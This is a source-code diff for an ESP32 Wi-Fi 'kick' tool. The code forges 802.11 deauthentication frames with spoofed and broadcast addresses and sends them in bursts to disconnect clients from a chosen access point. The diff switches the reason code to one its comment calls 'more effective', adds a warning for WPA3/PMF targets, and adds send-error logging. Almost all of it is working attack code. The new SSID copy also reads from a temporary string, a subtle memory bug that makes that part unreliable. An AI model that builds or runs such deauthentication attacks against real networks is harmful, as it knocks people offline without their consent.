@@ -14,7 +14,7 @@ static const uint8_t DEAUTH_BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 KickManager::KickManager()
     : targetSet_(false), targetIsOwnAP_(false), attacking_(false),
-      lastBurstMs_(0), packetCount_(0) {
+      lastBurstMs_(0), packetCount_(0), targetEncryption_(WIFI_AUTH_OPEN) {
   memset(targetBSSID_, 0, 6);
   targetSSID_[0] = '\0';
   memset(deauthBuf_, 0, sizeof(deauthBuf_));
@@ -29,18 +29,25 @@ void KickManager::setTargetFromScan(int scanIndex) {
   if (n <= 0 || scanIndex < 0 || scanIndex >= n) {
     targetSet_ = false;
     targetSSID_[0] = '\0';
+    targetEncryption_ = WIFI_AUTH_OPEN;
     return;
   }
   uint8_t *bssid = WiFi.BSSID(scanIndex);
   if (!bssid)
     return;
   memcpy(targetBSSID_, bssid, 6);
-  String ssid = WiFi.SSID(scanIndex);
-  size_t len = ssid.length();
-  if (len >= KICK_TARGET_SSID_LEN)
-    len = KICK_TARGET_SSID_LEN - 1;
-  ssid.toCharArray(targetSSID_, len + 1);
-  targetSSID_[len] = '\0';
+  // Optimized: use c_str() instead of String
+  const char *ssid = WiFi.SSID(scanIndex).c_str();
+  if (ssid) {
+    size_t len = strlen(ssid);
+    if (len >= KICK_TARGET_SSID_LEN)
+      len = KICK_TARGET_SSID_LEN - 1;
+    strncpy(targetSSID_, ssid, len);
+    targetSSID_[len] = '\0';
+  } else {
+    targetSSID_[0] = '\0';
+  }
+  targetEncryption_ = WiFi.encryptionType(scanIndex);
   targetSet_ = true;
 
   if (WiFi.status() == WL_CONNECTED) {
@@ -54,6 +61,9 @@ void KickManager::setTargetFromScan(int scanIndex) {
 bool KickManager::startAttack() {
   if (!targetSet_ || targetIsOwnAP_)
     return false;
+  if (isTargetProtected()) {
+    Serial.println("[KICK] WARNING: Target uses WPA3/PMF - attack may fail!");
+  }
   attacking_ = true;
   lastBurstMs_ = millis();
   packetCount_ = 0;
@@ -67,6 +77,12 @@ void KickManager::stopAttack() {
 }
 
 void KickManager::sendDeauthBurst() {
+  // Проверка состояния WiFi перед отправкой
+  if (WiFi.getMode() == WIFI_OFF) {
+    Serial.println("[KICK] WiFi is OFF, cannot send deauth packets");
+    return;
+  }
+
   // 26-byte deauth: FC(2), Duration(2), DA(6), SA(6), BSSID(6), Seq(2),
   // Reason(2)
   deauthBuf_[0] = 0xC0;
@@ -78,14 +94,19 @@ void KickManager::sendDeauthBurst() {
   memcpy(deauthBuf_ + 16, targetBSSID_, 6);    // BSSID = AP
   deauthBuf_[22] = 0x00;
   deauthBuf_[23] = 0x00;
-  deauthBuf_[24] = 0x01; // reason: unspecified
+  deauthBuf_[24] = 0x07; // reason: Class 3 frame received from nonassociated
+                         // station (more effective)
   deauthBuf_[25] = 0x00;
 
   esp_err_t e =
       esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, sizeof(deauthBuf_), false);
   if (e == ESP_OK) {
     packetCount_++;
+  } else if (e != ESP_ERR_WIFI_NOT_INIT) {
+    // Логируем ошибки кроме "WiFi not initialized" (это нормально при старте)
+    Serial.printf("[KICK] Deauth send error: %d\n", e);
   }
+
   // Second variant: DA=AP, SA=broadcast (fake client leaving)
   deauthBuf_[4] = targetBSSID_[0];
   deauthBuf_[5] = targetBSSID_[1];
@@ -98,6 +119,8 @@ void KickManager::sendDeauthBurst() {
   e = esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, sizeof(deauthBuf_), false);
   if (e == ESP_OK) {
     packetCount_++;
+  } else if (e != ESP_ERR_WIFI_NOT_INIT) {
+    Serial.printf("[KICK] Deauth send error (variant 2): %d\n", e);
   }
 }
 
@@ -126,4 +149,9 @@ void KickManager::getTargetBSSIDStr(char *out, size_t maxLen) const {
   snprintf(out, maxLen, "%02X:%02X:%02X:%02X:%02X:%02X", targetBSSID_[0],
            targetBSSID_[1], targetBSSID_[2], targetBSSID_[3], targetBSSID_[4],
            targetBSSID_[5]);
+}
+
+bool KickManager::isTargetProtected() const {
+  return (targetEncryption_ == WIFI_AUTH_WPA3_PSK ||
+          targetEncryption_ == WIFI_AUTH_WPA2_WPA3_PSK);
 }
